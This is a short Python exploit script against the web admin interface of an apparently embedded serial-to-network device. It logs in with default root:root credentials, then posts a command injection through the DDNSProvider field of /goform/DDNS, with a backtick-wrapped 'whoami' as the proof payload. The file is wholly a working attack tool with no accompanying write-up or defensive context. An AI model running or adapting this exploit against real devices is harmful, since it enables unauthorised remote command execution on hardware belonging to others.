import sys
import base64
import requests

ip = None
token = None

def login(name: str, passwd:str) -> str:
    ret = ''
    if name == None or passwd == None:
        print('[login error.]')
        return None
    base = base64.b64encode(bytes(name + ':' + passwd, encoding='utf-8'))
    base = str(base, encoding='utf-8')
    print(base)
    try:
        l = requests.get(url=f'http://{ip}/Serial2Net.asp', headers={'Authorization':'Basic ' + base})
        print(l.request.headers)
        if(b'Unauthorized' in l.content):
            print('[Acount Error]')
        else:
            ret = base
    except Exception as e:
        print('[login error]')
        print(e)

    return ret

def codeInjection(cmd):
    data = {'DDNSProvider':f'{cmd}', 'DDNS':'root','Account':"root",'Password':"root"}
    header = {'Authorization':'Basic ' + token}
    try:
        attack = requests.post(url = f'http://{ip}/goform/DDNS', headers=header, data=data)
        print(attack.content)
    except Exception as e:
        print(e)

if __name__ == '__main__':
    if(len(sys.argv) < 2):
        print("Usage: exp.py <ip>")
        exit(1)
    ip = sys.argv[1]
    token = login('root', 'root')
    codeInjection('`whoami`')